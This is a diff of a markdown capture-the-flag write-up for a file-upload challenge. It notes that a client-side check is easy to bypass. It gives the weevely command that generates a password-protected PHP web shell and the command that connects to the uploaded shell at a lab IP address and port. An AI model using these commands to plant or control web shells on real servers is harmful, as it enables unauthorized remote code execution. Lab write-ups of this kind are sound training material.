@@ -12,12 +12,16 @@
   - > Easy to bypass 
  
 - **Create shell.php**
-  - > using ***weevely*** tool: `weevely generate 123456 shell.php`
+  > using ***weevely*** tool: 
+  ```
+  weevely generate 123456 shell.php
+  ```
 
 - **Upload file and use weevely to connect**
-  - `weevely http://111.200.241.244:52749/upload/1627143863.shell.php  123456`
+  ```
+  weevely http://111.200.241.244:52749/upload/1627143863.shell.php  123456
+  ```  
+  ![Screenshot from 2021-07-24 23-26-32](https://user-images.githubusercontent.com/87865134/126874864-44f65981-046d-4d2b-99b4-e586a3c1a091.png)
 
-![Screenshot from 2021-07-24 23-26-32](https://user-images.githubusercontent.com/87865134/126874864-44f65981-046d-4d2b-99b4-e586a3c1a091.png)
-
-- **Description:**
-  - > category: file upload 
+### - Description:
+> **category**: file upload 
